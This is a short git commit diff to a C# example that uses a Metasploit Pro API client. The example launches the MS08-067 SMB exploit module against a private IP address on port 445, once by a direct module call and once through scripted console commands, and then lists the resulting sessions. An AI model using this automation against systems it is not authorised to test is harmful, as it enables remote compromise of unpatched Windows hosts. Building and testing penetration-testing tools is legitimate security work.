28a3d65abd86a49a5bdd06b779ae6bfaad97e738
Brandon Perry <bperry.volatile@gmail.com>
2012-04-06 22:07:07 -0500

    more fixins

--- ModuleExecuteExample/Main.cs
+++ ModuleExecuteExample/Main.cs
@@ -15,31 +15,31 @@ namespace ModuleExecuteExample
 				
 				using (MetasploitProManager manager = new MetasploitProManager(session))
 				{
-					//this commented block return a null job_id. No idea why.
-//					Dictionary<object, object> options = new Dictionary<object, object>();
-//					
-//					options.Add("RHOST", "192.168.1.129");
-//					
-//					Dictionary<object, object> response = manager.ExecuteModule("exploit", "exploit/windows/smb/ms08_067_netapi", options);
-//					
-//					foreach (KeyValuePair<object, object> pair in response)
-//						Console.WriteLine(pair.Key + ": " + pair.Value);
-				
-					var response = manager.CreateConsole();
+					Dictionary<object, object> options = new Dictionary<object, object>();
 					
-					foreach (var pair in response)
+					options.Add("RHOST", "192.168.1.129");
+					options.Add("RPORT", "445");
+					
+					Dictionary<object, object> response = manager.ExecuteModule("exploit", "windows/smb/msf08_067_netapi", options);
+					
+					foreach (KeyValuePair<object, object> pair in response)
 						Console.WriteLine(pair.Key + ": " + pair.Value);
-					
-					string consoleID = response[(object)"id"] as string;
-					
-					response = manager.WriteToConsole(consoleID, "use exploit/windows/smb/ms08_067_netapi\n");
-					System.Threading.Thread.Sleep(600);
-					response = manager.WriteToConsole(consoleID, "set RHOST 192.168.1.129\n");
-					System.Threading.Thread.Sleep(600);
-					response = manager.WriteToConsole(consoleID, "exploit\n");
-					System.Threading.Thread.Sleep(600);
-					
-					manager.ReadConsole(consoleID);
+				
+//					var response = manager.CreateConsole();
+//					
+//					foreach (var pair in response)
+//						Console.WriteLine(pair.Key + ": " + pair.Value);
+//					
+//					string consoleID = response[(object)"id"] as string;
+//					
+//					response = manager.WriteToConsole(consoleID, "use exploit/windows/smb/ms08_067_netapi\n");
+//					System.Threading.Thread.Sleep(600);
+//					response = manager.WriteToConsole(consoleID, "set RHOST 192.168.1.129\n");
+//					System.Threading.Thread.Sleep(600);
+//					response = manager.WriteToConsole(consoleID, "exploit\n");
+//					System.Threading.Thread.Sleep(600);
+//					
+//					manager.ReadConsole(consoleID);
 					
 					response = manager.ListSessions();
 					
@@ -48,7 +48,7 @@ namespace ModuleExecuteExample
 						foreach (var p in pair.Value as Dictionary<object, object>)
 							Console.WriteLine(enc.GetString(p.Key as byte[]) + ": "  + enc.GetString(p.Value as byte[]));
 					
-					manager.DestroyConsole(consoleID);
+//					manager.DestroyConsole(consoleID);
 				}
 			}
 		}
